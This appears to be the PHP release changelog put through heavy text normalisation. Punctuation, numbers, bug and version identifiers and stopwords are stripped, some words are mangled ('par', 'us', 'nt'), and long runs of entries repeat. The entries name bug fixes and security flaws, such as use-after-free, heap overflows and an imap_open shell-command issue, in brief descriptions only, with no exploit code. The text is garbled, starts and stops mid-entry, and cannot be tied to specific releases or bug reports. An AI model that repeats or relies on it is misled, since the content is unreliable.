current rowset nt fetched ignore potentially misleading dberr value implemented stringify uniqueidentifier field pdofirebird fixed bug memory corruption bindparam fixed bug integer returned integer pdopgsql fixed bug pdo statement fails throw exception fixed bug segmentation fault binding parameter query without placeholder implemented fr postgres pdo lastinsertid work without specifying sequence phar fixed bug bound verify signature zip phar pharparsezipfile fixed bug bound verify signature tar phar pharparsetarfile phpdbg added generator command inspection currently alive generator postgres fixed bug incorrect sql generated pgcopyto implemented fr pglastnotice needed get notice message implemented fr allow pgfetchall index numerically readline fixed bug readlineredisplay crash php reflection undo backwards compatiblity break reflectiontype tostring deprecate via documentation instead reverted prepending class name implemented request invoke invokeargs static method call match cmb add reflectionnamedtype getname method used instead reflectiontype tostring prepend class name nullable type returned reflectiontype tostring fixed bug reflectiontype tostring crash iterable fixed bug reflectionclass export nt handle array constant failure retrieve reflection object retrieve object property throw instance error instead resulting fatal error fix reflectionproperty getvalue nt fail object nt match type session fixed bug sessionunset empty value variable session stored fixed bug sessiondestroy null dereference psfilespathcreate fixed bug session report invalid uid file save handler fixed bug sid always return nameid even session cookie exist implemented sessiongc yasuo http wikiphpnetrfcsessioncreateid implemented sessioncreateid yasuo http wikiphpnetrfcsessiongc implemented rfc session id without hashing yasuo http wikiphpnetrfcsessionidwithouthashing fixed bug psfilescleanupdir buffer overflow custom session handler return string session id throw instance error instead resulting fatal error function called must generate session id invalid setting sessionhashfunction throw instance error instead resulting fatal error session id created fixed bug use free unserialize unexpected session deserialization improved fix bug empty session id still start session fixed bug sessionstart return true failure session save handler must return string always successful read ie nonexisting session read must return empty string php made tolerate buggy return value fixed bug sessionregenerateid must close opened session error simplexml fixed bug null pointer dereference simplexmlelement asxml fixed bug simplexml issetunset respect namespace fixed bug null coalescing operator nt behave expected simplexmlelement fixed bug using global var nt work accessing simplexml element creating unnamed duplicate attribute throw instance error instead resulting fatal error snmp fixed bug phpsnmpparseoid integer overflow memory allocation fixed bug use free vulnerability snmp gc unserialize soap fixed bug soapclient setsoapheaders nt overwrite soap header fixed bug segfault regression fixed bug soapserver report bad request gzipped fixed bug nested object element overwrites field fixed bug peer verification fails using proxy soapclient fixed bug soap server member variable reference bug fixed bug using reference array nt work like expected spl fixed bug reproducible crash gdb backtrace fixed bug segfault clone splfileobject fixed bug missing type check unserializing splarray fixed bug splfileobject getcsvcontrol return escape character fixed bug appenditerator segfault closed generator attempting clone spldirectory object throw instance error instead resulting fatal error calling arrayiterator append iterating object throw instance error instead resulting fatal error fixed bug globiterator throw logicexception update sqlite fixed bug unsetting result set may reset result set fixed bug fetched string fixed bug spurious warning exception thrown user defined function implemented fr sqlite allow opening empty filename fixed bug clearing binding statement nt work implemented fr upgraded bundled sqlite lib standard fixed bug http stream wrapper ignore http continue fixed bug scope inherited eval assert fixed bug parseurl return wrong hostname fixed bug passing additionalparameters cause mail fail fixed bug passing additionalparameters cause mail fail fixed bug accessing private constant using constant creates exception warning fixed bug getbrowser incorrectly par entry sign fixed bug negative ftruncate php memory exhaust memory fixed bug substrcompare null length interpreted fixed bug getimagesize returning false valid jpg fixed bug unset array item arraywalkrecursive cause inconsistent array fixed bug arraywalkrecursive move internal pointer fixed bug exchanging array arraywalk memory error fixed bug use free vulnerability arraywalk arraywalkrecursive fixed bug arraywalk arrayreplacerecursive create reference nothing fixed bug csv field incorrectly split escape char followed utf char implemented rfc precise float value arraymultisort us zendsort instead zendqsort fixed bug readfile mangle file larger assert throw parseerror evaluating string given first argument php code invalid instead resulting catchable fatal error calling forwardstaticcall outside class scope throw instance error instead resulting fatal error added isiterable function fixed bug heap overflow procopen env parameter fixed bug nt accept integer strict mode implemented fr add option pas custom stream context getheaders additional validation parseurl loginpass component implemented fr provide way fetch current environment variable unpack function accepts additional optional argument offset implemented stream context socket option tcpnodelay joe stream fixed bug phpuserfilter stream set stream filter working fixed bug streamsetblocking nt work fixed bug outofbound read phpstreamfiltercreate implemented fr multiple small packet send http request fixed bug ftp opendir wrapper data channel encryption fails ii ftp fixed bug missing skiponlinetests check fixed bug problem ftp wrapper fixed bug opendir work ftp wrapper fixed bug opendir ftp attempt open data stream nonexistent directory fixed bug ftp wrapper vulnerable protocol downgrade attack fixed bug streamsocketgetname crash fixed bug stream socket remote address lead segmentation fault sysvshm fixed bug shmattach null dereference tidy implemented support libtidy creating tidynode manually throw instance error instead resulting fatal error wddx fixed bug null pointer dereference wddx packet deserialization pdorow fixed bug wddx packet injection vulnerability wddxserializevalue fixed bug wddxdeserialize allows illegal memory access fixed bug wddxdeserialize null dereference fixed bug wddxdeserialize null dereference invalid xml fixed bug wddxdeserialize null dereference phpwddxpopelement fixed bug wddxdeserialize useafterfree fixed bug outofbounds read phpwddxpushelement fixed bug boolean always deserialized true circular reference serializing throw instance error instead resulting fatal error xml fixed bug malformed xml cause fault fixed bug xmlstartelementhandler segmentation fault fixed bug segv unknown address zifxmlparse xmlrpc fixed bug xmlrpcencode unexpected output referencing array element fixed bug heapbufferoverflow write simplestringaddn simplestringc circular reference serializing throw instance error instead resulting fatal error zip fixed bug impossible compile php zip support fixed bug null pointer dereference zendvirtualcwd fixed bug stackbased buffer overflow vulnerability phpstreamzipopener ziparchive addglob throw instance error instead resulting fatal error glob support available version dec core fixed bug segfault using convertquotedprintableencode filter imap fixed bug null pointer dereference imapmail fixed bug imapopen allows run arbitrary shell command via mailbox parameter phar fixed bug phardata always creates new file mode fixed bug heap buffer overflow read pharparsepharfile version sep fixed bug x due header transferencoding chunked version jul exif fixed bug int overflow lead heap overflow exifthumbnailextract exifc fixed bug heapbufferoverflow read size reading exif data fixed bug window linkinfo lack openbasedir check version apr exif fixed bug heap buffer overflow read exifiifaddvalue iconv fixed bug stream filter converticonv lead infinite loop invalid sequence ldap fixed bug malicious ldapserver response cause crash phar fixed bug fix may complete version mar fpm fixed bug dumpable fpm child process allow bypassing opcache access control version mar standard fixed bug stackbufferoverflow parsing http response version jan cli server fixed bug random invalid request unexpected eof using router script core fixed bug php seems incompatible onedrive file demand fixed bug segmentation fault fpm fixed bug libxmldisableentityloader setting shared request gd fixed bug potential infinite loop gdimagecreatefromgifctx opcache fixed bug interned string buffer overflow may cause crash pcre fixed bug preglasterror returning error code error phar fixed bug reflected x phar page standard fixed bug inappropriately parsing http response lead php segment fault fixed bug accept efault addition enosys indicator getrandom missing zip fixed bug segfault libzip version nov core fixed bug crash modifing property name isset bpvaris fixed bug mmapmunmap trashing unlucky allocation cli fixed bug builtin webserver crash chdir shutdown function enchant fixed bug enchantbrokergetpath crash path set fixed bug enchant still report version exif fixed bug exif extension built revision version gd fixed bug imagerotate may alter image dimension fixed bug wrong reflection imagewebp intl fixed bug uconverter setdestinationencoding change source instead destination interbase fixed bug incorrect reflection ibase p connect mysqli fixed bug wrong reflection mysqlifetchall function opcache fixed bug warning internal error wrong size calculation openssl fixed bug leak memory fixed bug wrong reflection opensslopen function pgsql fixed bug default link incorrectly clearedlinked pgclose soap fixed bug wrong reflection soapclient setsoapheaders zlib fixed bug wrong reflection inflateinit inflateadd version oct core fixed bug null pointer dereference zendmmallocsmall fixed bug infinite loop printing errormessage fixed bug incorrect token formatting two parse error one request fixed bug segfault calling iscallable parent fixed bug debug info closure internal function contain garbage argument name fixed bug error zendhashkey member named arkey date fixed bug outofbounds read timelibmeridian intl fixed bug parameter uconverter getaliases optional mcrypt fixed bug arcfour encryption stream filter crash php fixed incorrect reference counting pcre fixed bug applied upstream patch litespeed fixed bug binary directory nt get created building litespeed sapi fixed bug missing program prefix suffix spl fixed bug spldoublylinkedlist setiteratormode mask intern flag version sep core fixed bug runtestsphp issue extension block bcmath fixed bug bcpowmod fails scale fixed bug bc math handle minus zero incorrectly fixed bug bcpowmod may return modulus fixed bug bcpowmod misbehaves noninteger base modulus cli server fixed bug builtin server truncates header spanning tcp packet curl fixed bug openssl support detected gd fixed bug gdimagegrayscale may produce color fixed bug suspicious gettext fixed bug textdomain null throw strict mode intl fixed bug intlgregoriancalendar nt constant parent class pdooci fixed bug pdopco phpfpm oci environment initialized phpfpm set spl fixed bug incorrect behavior appenditerator append foreach loop standard fixed bug gethostname fails host name char long version aug core fixed bug segfault scanner inf number fixed bug null deref segfault zendgeneratorresume fixed bug break unhandled exception fixed bug nan comparison curl fixed bug fixed finding curl system multiarch support date fixed bug null pointer dereference timelibtimeclone intl fixed bug wrong reflection locale function mbstring fixed bug segmentation fault mbstrcut htmlentities encoding fixed bug mbconvertkana convert iteration mark fixed bug wrong reflection mberegireplace mysqli fixed bug php crash calling mysqliresult fetchobject abstract class expose ociunregistertafcallback tianfang yang phar fixed bug includepath char limit case reflection fixed bug null pointer dereference functionstring session fixed bug sid constant created wrong module number simplexml fixed bug nullpointer deref simplexmlelementgetdocnamespaces spl fixed bug splautoloadunregister ca nt handle splautoloadfunctions result fixed bug unserialize arrayiterator broken fixed bug crash recursive iterator destructors standard fixed bug unpack x cause infinity loop fixed bug heapuseafterfree unserializing invalid array size fixed bug denial service vulnerability found performing deserialization wddx fixed bug wddx us wrong decimal seperator xmlrpc fixed bug incorrect xmlrpc serialization class declared property version aug core fixed bug loading php extension already registered function name lead crash fixed bug parseurl borken query string contains colon fixed bug unary operator expected error system fixed bug use free unserialize splfixedarray fixed bug fixed incorrect pollh include fixed bug fixed incorrect errnoh include date fixed bug propertyexists return true unknown dateinterval property fixed bug integer overflow ocibindarraybyname opcache fixed bug opcache overwrites argument generatorreturn within finally pdo fixed bug pdostatement debugdumpparams truncates query spl fixed bug php freeze appenditerator fixed bug construct produce memory exception invalid flag wddx fixed bug huge memleak wddxunserialize fixed bug wddx parsing empty boolean tag lead sigsegv zlib fixed bug dictionary option inflateinit work version jul core fixed bug multiple path host section properly parsed fixed bug undefined constant array property result broken property fixed misparsing abstract unix domain socket name fixed bug unserialize heap useafterfree read zvalgettype fixed bug heap buffer overread read finishnesteddata unserialize fixed bug php ini parsing stack buffer overflow vulnerability fixed bug wddxdeserialize heap outofbound read via phpparsedate dom fixed bug reference deleted xpath query result gd fixed bug buffer overread uninitialized memory intl fixed bug stack buffer overflow msgfmtparsemessage fixed bug wrong reflection collator getsortkey collatorgetsortkey fixed bug graphemestrpos illegal memory access mbstring add oniguruma upstream fix add taf callback pr opcache fixed bug segfault opcachememoryprotect validatetimestamp openssl fixed bug negativesizeparam memcpy zifopensslseal pcre fixed bug segmentation fault compiled using bundled pcre library pdooci support instant client withpdooci configure option reflection fixed bug segfault cast reflection object string undefined constant spl fixed bug null coalescing operator failing splfixedarray standard fixed bug invalid reflection signature randombytes randomint fixed bug heap buffer overflow substr ftp fixed bug ftp wrapper ignores context arg phar fixed bug phar construct reflection incorrect soap fixed bug incorrect conversion array wsdlcachememory stream fixed bug streamsocketgetname return version jun core fixed bug crash sigsegv zendhashaddorupdatei fixed bug sigill zendfetchclassconstantspecconstconst intl fixed bug wrong reflection collator sortwithsortkeys mysqli fixed bug mysqli changeuser nt accept null database argument wstricttypes opcache fixed bug sigsegv opcacherevalidatepath enabled phar fixed bug phar webphar handle request sent put delete method standard fixed bug anchor cc header bcc xmlreader fixed bug wrong reflection xmlreader expand version may core fixed bug null coalescing operator fails undeclared static class property fixed bug endless loop bypassing execution time limit fixed bug streamselect broken window nanoserver fixed bug phpcgiexe crash facebook callback patch bug reverted date fixed bug wrong reflection datetimezone gettransitions fixed bug add constant format datetime dom fixed bug wrong reflection domnode clonenode fileinfo fixed bug syntax error compile error libmagicapprenticec gd fixed bug compile fails solaris system library intl fixed bug wrong reflection normalizer method fixed bug wrong reflection locale method mysqli fixed bug mysqliconnect adding host port parameter given mysqlnd added support mysql type fixed bug invalid free persistent result errorconnection loss openssl fixed bug null character allowed opensslpkeygetprivate fixed bug segfault opensslpkeynew generating dsa dh key fixed bug fails parse utctime without second added openssl support phar fixed bug phar method parameter reflection correction standard fixed bug reflection information inigetall incomplete fixed bug setcookie allows maxage negative stream fixed bug remote socket uri unique persistence identifier broken fixed bug incorrect reflection enableexceptions version apr core fixed bug falsely exit memory using fixed bug leak instance method calling static method referenced return fixed bug build problem release undefined reference isfinite fixed bug yield fromlabel overgreedy apache reverted patch bug fix bug date fixed bug swatch time value incorrect date dom fixed bug libxmlnowarning flag ingnored loadhtml iconv fixed bug iconv fails fail surrogate openssl fixed bug fwrite nonblocking ssl socket nt work pdo mysql fixed bug expose mysqliclientssldontverifyservercert pdo interface stream fixed bug correctly fail invalid ip address port zlib fixed bug deflateadd allocate much memory version mar core fixed bug php segfaults within symfony test suite fixed bug bound read zendmmallocsmall fixed bug performance problem processing large post request fixed bug arraykeyexists fails array created getobjectvars fixed bug nan check fails alpine linux musl fixed bug isinfinite inf return false fixed bug generating pharphar core dump gcc asan enabled build apache fixed bug incomplete post timeout passed php date fixed bug relative datetime format ignores weekday sunday fixed bug datetime wrong date string negative fixed bug wrong timestamp call settimezone multi time utc offset fixed bug firstlast day flag reset fixed bug date modify friday week nt return friday date sunday fixed bug wrong day using week strtotime fpm fixed bug phpfpm process accounting broken keepalive hash fixed bug gostcrypto hash incorrect input data contains long sequence gd fixed bug reflectionfunction imagepng missing last two parameter mysqlnd fixed bug fetcharray broken data data mediumblob opcache fixed bug statement say true null variable fixed bug segfault list openssl fixed bug php fast cgi crash reading pfx file standard fixed bug reflectionfunction incorrectly report number argument fixed bug mailaddxheader cause rfcbreaking lone line feed fixed bug iscallable callable name report misleading value anonymous class fixed bug php linux use devurandom getrandom available stream fixed bug invalid memory access zendinlinehashfunc fixed bug streamgetcontents maxlength return empty string version feb core fixed bug zendprintflatzvalr nt consider reference fixed bug crash exporting expansion assign op fixed bug segfault debugprintbacktrace fixed bug assertion error debugzvaldump dom fixed bug getattributenodens nt get xmlns attribute dtrace fixed bug dtrace reported enabled disabled fpm fixed bug double fastcgiendrequest maxchildren limit fixed bug phpfpm close stderr using syslog gd fixed bug premature failing xbm reading gmp fixed bug test gmph need test machine includes intl fixed bug link use cc instead cxx ldap fixed bug errorsegfault ldapmodreplace opcache mysqli fixed bug leak mysqlifetchobject mysqlnd fixed bug segfault close freeresult mysqlnd opcache fixed bug crash finish work phar cli opcache openssl fixed bug add serial hex return value array pdofirebird implemented fr data fetched string pdopgsql fixed bug lastinsertid fails throw exception wrong sequence name phar fixed bug phardata compress nt close temp file posix fixed bug configure script incorrectly check ttynamer session fixed bug session readable root cli spl fixed bug splautoload crash call magic call standard fixed bug closing fd incorrect pt enabled fixed bug soapclient stumble wsdl delivered transferencoding chunked fixed bug imap undefined service aix fixed bug moneyformat store wrong length aix zip fixed bug ziparchive addglob ignores removeallpath option version jan core fixed bug invalid foreach loop hang script fixed bug invalid opcode occurs variable created list fixed bug logging internal zend error missing class information missing class name fixed bug unserialized array pointer advancing fixed bug heap bound read unserialize finishnesteddata fixed bug null pointer dereference unserialize php object fixed bug use uninitialized memory unserialize fixed bug unserialize useafterfree resizing object property hash table fixed bug use free unserialize fixed bug type confusion object deserialization com fixed bug dotnet read access violation using invalid codepage dom fixed bug getelementsbytagnamens filter default n exif fixed bug fpe parsing tag format gd fixed bug signed integer overflow gdioc fixed bug do vulnerability gmp fixed bug gmp deserialization type confusion vulnerability mysqli fixed bug persistent connection nt set connecterrno mysqlnd fixed issue decoding bit column one row result set problem fixed bug sporadic segfault mysqlioptintandfloatnative pcre fixed bug preg may leak memory pdofirebird fixed bug pdofirebird firebird work returning statement phar fixed bug seg fault loading hostile phar fixed bug memory corruption loading hostile phar fixed bug crash loading hostile phar archive phpdbg fixed bug phpdbg without option never load phpdbginit startup fixed issue getting executable line custom wrapper fixed bug phpdbg show wrong line file shebang reflection fixed bug reflectionobject memory leak stream fixed bug phpuserfilter stream set stream filter working reverted fix unsetting result set may reset result set standard fixed bug dnsgetrecord populate additional parameter fixed bug unserialize context shared double class lookup fixed bug serialize object sleep function crash fixed bug getbrowser function slow fixed bug loading browscapini startup cause high memory usage fixed bug getdefinedfunctions additional param exclude disabled function zlib fixed bug deflateadd verify output truncated version dec core fixed memory leak null coalescing operator spl hash fixed bug slow performance fetching large dataset mysqli pdo fixed bug use free vulnerability unserialize calendar date fixed bug dateinterval property isset dtrace disabled php call tracing default make significant overhead may enabled using envirionment variable json fixed bug phpjsonencode depth issue mysqlnd fixed bug add missing mysqlnd parameter phpini odbc fixed bug odbcerrormsg return trash always byte opcache fixed bug check cached file permission fixed bug logging opcache empty file name pcre fixed bug segmentation fault pcrereplacecallback fixed bug useafterfree zend allocator management pdofirebird phar fixed bug phar isvalidpharfilename illegal memory access postgres fixed bug incorrect sql generated pgcopyto soap fixed bug soapclient setsoapheaders nt overwrite soap header fixed bug segfault regression spl fixed bug reproducible crash gdb backtrace fixed bug unsetting result set may reset result set standard fixed bug http stream wrapper ignore http continue fixed bug versioncompare illegal write access wddx fixed bug invalid read wddx decodes empty boolean element xml fixed bug malformed xml cause fault version nov core fixed bug exception tostring cause circular reference fixed bug parsestr without second argument lead crash fixed bug autoload opcache allows importing conflicting class name namespace fixed bug sub namespaces unexpected behaviour fix pthreads detection crosscompiling fixed bug trycatch working two exception inside operation fixed bug exception thrown error handler cause valgrind warning crash fixed bug float nano nan gd fixed bug integer overflow imageline antialiasing fixed bug imagescale affected affect imagesetinterpolation fixed bug integer overflow gdimagescalebilinearpalette fixed bug stack buffer overflow gd dynamicgetbuf fixed bug ilegal writeread access caused gdimageaaline overflow fixed bug imagefilltoborder stackoverflow truecolor image imap fixed bug integer overflow phpimapmail lead crash fixed bug bind reference overwritten php phpdbg properly allow stdin input file add command line option stdin command reading script stdin ignore nonexecutable opcodes line mode phpdbgendoplog fixed bug simple sigint effect rr fixed bug ini file loaded even invoked n version session fixed bug sessionunset empty value variable session stored soap fixed bug soapserver report bad request gzipped fixed bug nested object element overwrites field fixed bug peer verification fails using proxy soapclient fixed bug fetched string standard fixed bug passing additionalparameters cause mail fail fixed bug arrayreplacerecursive sometimes mutates parameter fixed bug parseurl return wrong hostname wddx fixed bug null pointer dereference wddx packet deserialization pdorow version oct fixed bug heap buffer overflow virtualpopen zendvirtualcwdc fixed bug bound global memory read bfcrypt triggered passwordverify fixed bug crypt broken salt long fixed bug invalid free extension trait fixed bug segfault undefined function fixed bug php hang error handler throw accessing undef const default value fixed bug parse error invalid numeric literal fixed bug write bound numberformat fixed bug use free unserialize fixed bug memcpy negative size parameter phpresolvepath bcmath fixed bug memcpy negative parameter bcnewnumex com fixed bug pas parameter reference date fixed bug unserializing dateinterval object may lead tostring invocation dom fixed bug missing null check domdocumentsavehtml filter fixed bug bad filter flag filterflagnoresrange filterflagnoprivrange fixed bug default option ignored object passed int filter gd fixed bug imagetruecolortopalette white duplicated palette fixed bug imagettftext broken transparent background wo alphablending fixed bug integer overflow gdimagewebpctx gdwebpc fixed bug imagettfbbox give incorrect value bounding box fixed bug ignores param given fixed bug writes wrong chunk size boundary fixed bug unrecognized format may result corrupted file fixed bug may leak memory intl fixed bug add mitigation icu int overflow mbstring fixed bug mbsubstr take signed integer fixed bug mbconvertvariables detect recursion fixed bug mbstringinternalencoding nt inherit defaultcharset mysqlnd fixed bug php crash modifying array containing mysqli result data opcache fixed bug memory leak zendaccelblacklistupdateregexp function openssl fixed bug invalid path sniservercerts cause segfault fixed bug crash opensslrandompseudobytes function fixed bug crash opensslencrypt function pcre fixed bug bundled pcre nt compile jit nt supported fixed bug heap overflow phppcrereplaceimpl pdodblib fixed bug never quote value raw binary data allow pdo setattribute set query timeouts handle sqldecimalsqlnumeric type used later tds version add common pdo test suite free error message string cleaning pdo instance fixed bug pdostatement nextrowset succeed row current rowset nt fetched ignore potentially misleading dberr value phpdbg fixed bug phpdbgpromptc undefined reference dlload fixed next command stopping leaving function session fixed bug session report invalid uid file save handler fixed bug sessiondestroy null dereference psfilespathcreate simplexml fixed bug null pointer dereference simplexmlelement asxml soap fixed bug soap server member variable reference bug fixed bug using reference array nt work like expected spl fixed bug fixed bug splobjectstorage unserialize allows use nonobject key updated bundled zip fixed bug depacking wrong password leaf length file version sep fixed bug null pointer deref zvaldelrefp fixed bug assigndim string nt reset hval fixed bug memleak zendbinaryassignopobjhelper fixed bug segfault get returned ref fixed bug php segfaults trying expand infinite operator fixed bug php crash duplicate destructor call fixed bug streamsocketrecvfrom read access violation com fixed bug com called php return parameter dba fixed bug fetch multiple value group ini file ftp fixed bug upload file using ftpput ftpes requiresslreuse gd fixed bug imagesetstyle cause oob read empty style fixed bug imagecopy support transparency truecolor image fixed bug imagecopy loses singlecolor transparency palette image fixed bug possible resource leak phpimageconvert iconv fixed bug iconvsubstr return false empty string imap fixed bug imapmail null dereference intl fixed bug grapheme unicode compliant cr lf sequence fixed bug add locale length check mysqlnd fixed bug heap overflow mysqlnd related bit field fixed invalid handle error implicit result set fixed bug binding null value trigger error opcache fixed bug typo opcache error message pdo fixed bug invalid memory access using persistent pdo connection fixed bug memory leak pdo persistent connection handling fixed bug call empty null result using pdo fetchlazy return false pdodblib implemented stringify uniqueidentifier field pdopgsql implemented fr postgres pdo lastinsertid work without specifying sequence fixed bug regression pgopgsql phar fixed bug bound verify signature zip phar pharparsezipfile fixed bug bound verify signature tar phar pharparsetarfile reflection fixed bug getconstant array constant constant value return nullnfcuknown session fixed bug sessionuploadprogress kill httpd fixed bug sid always return nameid even session cookie exist simplexml fixed bug simplexml issetunset respect namespace fixed bug null coalescing operator nt behave expected simplexmlelement spl fixed bug missing type check unserializing splarray standard fixed bug substrcompare null length interpreted fixed bug getimagesize returning false valid jpg fixed bug getbrowser incorrectly par entry sign stream fixed bug streamsetblocking nt work fixed bug ftp opendir wrapper data channel encryption fails ii ftp fixed bug negative ftruncate php memory exhaust memory downgraded bundled sqlite see sysvshm fixed bug shmattach null dereference wddx fixed bug wddxdeserialize useafterfree fixed bug outofbounds read phpwddxpushelement xml fixed bug segv unknown address zifxmlparse fixed bug xmlstartelementhandler segmentation fault zip fixed bug impossible compile php zip support version aug fixed bug caught exception assignment variable ignores reference fixed bug calling earlier instance included anonymous class fatals fixed bug previous property undefined exception deserialization fixed bug declare public method signature incompatible parent private method fixed bug microtime leak memory fixed bug unable set enabledebug building extension phpize window fixed bug causing closedgeneratorexception thrown calling code instead generator yielding implemented fr support nmake test building extension phpize fixed bug phpize window ignores phpprefix fixed potential segfault object storage freeing shutdown sequence fixed bug create unexpected object nt invoke wakeup deserialization fixed bug php session data injection vulnerability fixed bug getmxrr broken fixed bug memory allocator fails realloc small block large one fixed bug integer overflow bzdecompress caused heap corruption calendar fixed bug caldaysmonth fails final month french calendar fixed bug addresssanitizer globalbufferoverflow zifcalfromjd com fixed bug dotnetcom array parameter broke curl fixed bug curlsetopt segfault empty curlopthttpheader fixed bug curlinfocertinfo data parsing error fixed bug heap overflow curlescape dom fixed bug dom document dangling reference exif fixed bug samsung picture thumb read zero size fixed bug memory leakage exifprocessifdintiff filter fixed bug filterflagnoresrange cover whole range fpm fixed bug using allowtorunasroot ignore missing user gd fixed bug imagetypes function wo nt advertise webp support fixed bug imagearc ignores thickness full arc fixed bug server error page fully rendered fixed bug broken transparency imagearc truecolor blendingmode fixed bug always false condition extgdlibgdgdkanjic fixed bug suspicious ifelse statement fixed bug selectcolors write outofbounds fixed bug imagegammacorrect allows arbitrary write access fixed bug imagecropauto outofbounds access intl fixed bug segfault instantiating class extends intlcalendar add property partially fixed fixed bug idntoascii ut incorrect long domain name mbstring fixed bug mberegsearch raise warning match zerowidth fixed bug mberegsearch increment search position match zerowidth fixed bug mberegsearchsetpos accept string last position fixed bug mbereg cause buffer overflow regexp compile error mcrypt fixed bug heap overflow due integer overflow opcache fixed bug opcache restart killalllockers work pcre fixed bug pregmatch missing group name match pdopgsql fixed bug pdo statement fails throw exception reflection fixed bug reflectionclass export nt handle array constant simplexml fixed bug using global var nt work accessing simplexml element snmp fixed bug phpsnmpparseoid integer overflow memory allocation spl fixed bug globiterator throw logicexception fixed bug splfileobject getcsvcontrol return escape character fixed bug appenditerator segfault closed generator fixed bug spurious warning exception thrown user defined function fixed bug bindvalue bindparam crash implemented fr sqlite allow opening empty filename updated standard fixed bug arraywalk arrayreplacerecursive create reference nothing fixed bug strict fails detect null byte fixed bug skip character padding strict mode fixed bug strict fails whitespace padding fixed bug csv field incorrectly split escape char followed utf char stream fixed bug problem ftp wrapper fixed bug opendir work ftp wrapper fixed bug opendir ftp attempt open data stream nonexistent directory fixed bug ftp wrapper vulnerable protocol downgrade attack xmlrpc fixed bug xmlrpcencode unexpected output referencing array element wddx fixed bug boolean always deserialized true fixed bug wddx packet injection vulnerability wddxserializevalue fixed bug wddxdeserialize allows illegal memory access fixed bug wddxdeserialize null dereference fixed bug wddxdeserialize null dereference invalid xml fixed bug wddxdeserialize null dereference phpwddxpopelement zip fixed bug null pointer dereference zendvirtualcwd version jul fixed bug strange reference recursive function call switch statement fixed bug stackbased buffer overflow vulnerability virtualfileex fixed bug httpproxy improperly trusted php library application fixed bug inadequate error handling bzread cli fixed bug scriptfilename show wrong path user specify routerphp com fixed bug variantdatefromtimestamp null dereference curl fixed bug sizet overflow lead heap corruption date fixed bug datetime createfromformat u pre date fails parsing exif fixed bug bound read exifprocessifdinmakernote fixed bug null pointer dereference exifprocessusercomment gd fixed bug thick styled line scrambled pattern fixed bug xbm image require width multiple fixed bug imagefilledpolygon nt draw horizontal line fixed bug gdimagetruecolortopalettebody allows arbitrary writeread access fixed bug imagegifoutput outofbounds access fixed bug integer overflow error within gdcontributionsalloc fixed bug ilegal writeread access caused gdimageaaline overflow fixed bug imagecropauto outofbounds access intl fixed bug localeacceptfromhttp outofbounds access mbstring fixed bug mberegreplace mbctocode oniguruma oob read access fixed bug useafterfree mbstring searchre mcrypt fixed bug bug incorrect casting sizet int lead heap overflow mdecryptgeneric pdopgsql fixed bug segmentation fault binding parameter query without placeholder pcre fixed bug memleak jitstack fixed bug mail fails invalid argument readline fixed bug readlineredisplay crash php standard fixed bug readfile mangle file larger fixed bug heap overflow procopen env parameter session fixed bug psfilescleanupdir buffer overflow fixed bug use free unserialize unexpected session deserialization snmp fixed bug use free vulnerability snmp gc unserialize stream fixed bug stream socket remote address lead segmentation fault xmlrpc fixed bug heapbufferoverflow write simplestringaddn simplestringc zip fixed bug stackbased buffer overflow vulnerability phpstreamzipopener version jun fixed bug host name resolved php crash fixed bug segfault pasttheend access fixed bug integer overflow fixed bug integer overflow jsonencode jsondecode fixed bug integer overflow addcslashesaddslashes fixed bug integer overflow length stringtyped zval date fixed bug strtotime seems use sunday monday start week fpm fixed bug fastcgifinishrequest logging environment variable gd fixed bug outofbounds access fixed bug invalid dimension lead crash fixed bug integer overflow resulting heap overflow fixed bug null pointer dereference gdscalevert fixed bug integer overflow gdimagepalettetotruecolor resulting heap overflow intl fixed bug selectordinal nt work named parameter mbstring fixed bug phpmbregexeregreplaceexec double free mcrypt fixed bug heap overflow due integer overflow openssl fixed bug segfault calling errfreestrings pcre fixed bug pregreplace us int instead sizet pdopgsql fixed bug segfault core dumped paramno beyond bound fixed bug segmentation faultinvalid pointer connection pgsqlstmtdtor phar fixed bug invalid free pharextractfile phpdbg fixed bug phpdbg fatal error coverage postgres fixed bug pgpconnectpgconnect cause useafterfree fixed bug pglocreate arbitrary read standard fixed bug range float step produce unexpected result fixed bug dnsgetrecord return array containing element type unknown fixed bug wrong reference serializeunserialize object fixed bug ignoreuserabort false effect wddx fixed bug double free courruption wddxdeserialize xml fixed bug xmlparsercreatexmlparserfree leak mem xmlrpc fixed bug useafterfree caused getzvalxmlrpctype zip fixed bug ziparchive convert filename unrecoverable form fixed bug ziparchive class use free vulnerability php gc algorithm unserialize version may fixed bug useafterfree errorreporting add compiler option disable special case function call fixed bug crash complex code fixed bug implode insert garbage resulting string join big integer fixed bug php hang using custom error handler typehint fixed bug function call value byref parameter nt always throw notice fixed bug memory leak closure parameter named fixed bug allowed constant expression fixed bug imported class override local class name curl fixed bug define curlesslcacertbadfile dba fixed bug useafterfree caused dbaopen gd fixed bug imagescale outofbounds read intl fixed bug add intluseexceptions phpini fixed bug geticuvalueinternal outofbounds read json fixed bug behavior jsonserializable different jsonencode mbstring fixed bug null pointer dereference mberegreplace fixed bug ocifetchall segfaults selecting eight column opcache fixed bug including file anonymous class multiple time lead fatal error openssl fixed bug null pointer dereference opensslcsrnew pcntl fixed bug pcntlwaitpcntlwaitpid array internal structure overwrite posix fixed bug phpposixgrouptoarray crash grpasswd null postgres fixed bug pgqueryparams null convert empty string fixed bug pgconvert nt accept iso datatype timestamp fixed bug mysqlifetchobject changed behaviour patch reverted reflection fixed bug reflectionproperty getvalue cause isset call session fixed bug cyclic reference causing sessionstart failed decode session object socket added socketexportstream function getting stream compatible resource socket resource spl fixed bug reference callbackfilteriterator nt work expected fixed bug bindvalue using right data type standard fixed bug referencing socket resource break streamselect fixed bug arraycolumn array object discard value matching null version apr fixed bug zvaldtorfunc assertion arr gcrefcount failed fixed bug crash assert new class fixed bug reference lost switch fixed bug interface allow final abstract function fixed bug zendobjectsstorecalldestructors operates realloced memory crashing fixed bug eg errorzval handled well fixed bug multiple heap overflow phprawurlencode phpurlencode fixed bug null coalescing operator arrayaccess fixed bug segmentation fault zts gethostbyname fixed bug inheritance trait interface fixed bug null coalescing operator magic fixed bug access array key uksort fixed bug arrayaccess isset offsetexists method fixed bug debuginfo empty string key give error fixed bug arrayobject isset friend fixed bug decoratednested generator uncloseable finally bcmath fixed bug bcpowmod accepts negative scale corrupts one definition curl fixed bug curloptnoproxy applied long instead string date fixed bug dateinterval format segmentation fault exif fixed bug bound heap read access exif header processing gd fixed bug libgd signedness vulnerability intl fixed bug intldateformatter loos locale pattern set via constructor fixed bug missing constant intlchar nonumericvalue fixed bug inconsistency return value intlchar method fixed bug stackoverflow datefmtcreate fixed bug locale lookup incorrectly return en enus locale empty fixed bug selectordinal nt work named parameter fixed bug outofbounds read 